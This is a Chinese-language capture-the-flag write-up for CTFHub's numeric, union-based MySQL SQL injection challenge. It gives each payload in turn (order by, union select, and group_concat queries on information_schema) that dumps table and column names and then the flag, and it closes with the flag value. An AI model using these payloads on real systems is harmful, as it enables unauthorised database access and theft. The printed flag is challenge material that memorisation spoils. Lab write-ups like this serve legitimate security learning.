---
title: CTFHub-SQL注入-MySQL结构 Writeup
date: 2026-09-28
category: web
tags: [CTFHub, SQL注入, MySQL结构]
---
## 题目分析
· 漏洞类型：数字型 SQL 注入、联合查询注入（Union-Based）
· 数据库环境：MySQL
· 解题思路：通过联合查询判断回显位，利用 information_schema 库逐级获取数据库名、表名、列名，最终查得 Flag。

## 解题过程

### 探测注入类型与回显位

输入 1，页面正常回显 ID: 1 和 Data: ...。
构造 Payload 判断字段数：

```sql
1 order by 2
```

页面正常回显，说明当前查询共有 2 个字段。
构造 Payload 判断回显位置：

```sql
-1 union select 1,2
```

页面回显 ID: 1 和 Data: 2，说明第 1 个字段回显在 ID 位置，第 2 个字段回显在 Data 位置。（注意：id=-1 是为了让前面的查询为空，从而只显示我们 union 后面查出的结果）。

### 获取数据库名与表名

获取当前数据库名：

```sql
-1 union select 1,database()
```

得到数据库名为 sqli。

爆表名（使用 group_concat 将多行结果合并为一行方便回显）：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

得到表名：membejhcqs。（题目中通常会随机生成表名，以此增加难度）。

### 获取列名

根据上一步获取的表名 membejhcqs，去 information_schema.columns 中查询该表的列名：

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='membejhcqs'
```

页面回显：

ID: 1
Data: pycjkzbqjo

（注：这里的 pycjkzbqjo 即为表内所有列名合并后的结果。通常 CTF 题目中可能是一列名或者多列名的组合，此题中直接作为列名使用即可）。

### 爆出数据（Flag）

既然已经拿到了表名（membejhcqs）和列名（pycjkzbqjo），直接查询这个列的数据即可拿到 Flag：

```sql
-1 union select 1,group_concat(pycjkzbqjo) from membejhcqs
```

页面回显 Data: ctfhub{xxxxxxxxxxxxxxxxx}，成功拿到 Flag！

## Flag
ctfhub{49bcd5014e427db01f3cdf1a}
